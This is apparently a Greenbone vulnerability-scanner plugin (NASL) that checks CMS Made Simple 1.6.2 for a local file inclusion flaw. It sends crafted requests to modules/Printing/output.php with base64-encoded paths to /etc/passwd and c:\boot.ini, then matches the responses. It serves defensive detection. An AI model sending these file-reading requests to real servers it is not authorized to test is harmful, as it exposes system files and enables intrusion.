# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:cmsmadesimple:cms_made_simple";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.901141");
  script_version("2025-03-05T05:38:52+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:52 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2010-08-26 15:28:03 +0200 (Thu, 26 Aug 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("CMS Made Simple 1.6.2 LFI Vulnerability - Active Check");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_cms_made_simple_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cmsmadesimple/http/detected");

  script_tag(name:"summary", value:"CMS Made Simple is prone to a local file inclusion (LFI)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
  via the 'url' parameter to 'modules/Printing/output.php' that allows remote attackers to view
  files and execute local scripts in the context of the webserver.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain potentially
  sensitive information and to execute arbitrary local scripts in the context of the webserver
  process.");

  script_tag(name:"affected", value:"CMS Made Simple version 1.6.2 and probably prior.");

  script_tag(name:"solution", value:"Update to version 1.6.3 or later.");

  script_xref(name:"URL", value:"http://www.cmsmadesimple.org/2009/08/05/announcing-cmsms-163-touho/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/36005");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

foreach file (make_list("L2V0Yy9wYXNzd2Q=", "YzpcYm9vdC5pbmk=")) {
  url = dir + "/modules/Printing/output.php?url=" + file;
  if(http_vuln_check(port: port, url: url, pattern: "(root:.*:0:[01]:|\[boot loader\])")) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
